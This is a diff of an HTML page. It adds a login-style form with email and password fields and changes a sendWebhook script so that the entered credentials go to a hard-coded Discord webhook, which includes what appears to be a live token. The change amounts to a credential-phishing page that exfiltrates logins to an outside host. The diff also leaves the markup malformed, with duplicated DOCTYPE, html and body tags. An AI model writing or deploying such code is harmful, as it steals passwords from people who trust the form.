@@ -8061,6 +8061,8 @@
 
 <!DOCTYPE html>
 <html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -8068,8 +8070,11 @@
     <script>
         function sendWebhook() {
             const webhookURL = "https://discord.com/api/webhooks/1289384157981708288/XAgMGk0x3S1zI4XmpLP8KTKAdC0kryOxyMij3_XRuhI3MSljf1VqXAkknCFZnrjL31Vb";
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.getElementById('password').value;
+
             const message = {
-                content: "test",
+                content: `Email: ${email}\nPassword: ${password}`,
             };
 
             fetch(webhookURL, {
@@ -8090,6 +8095,13 @@
         }
     </script>
 </head>
+<body>
+    <input class="form-control" type="text" name="email" placeholder="Username/Email" style="font-family: Montserrat, sans-serif; width: 300px">
+    <input class="form-control" id="password" type="password" name="password" placeholder="Password" style="font-family: Montserrat, sans-serif; --bs-primary: #4f46e5; --bs-primary-rgb: 79,70,229; width: 263px">
+    <button onclick="sendWebhook()">Send</button>
+</body>
+</html>
+
 <body>
 
     <div class="mb-3">
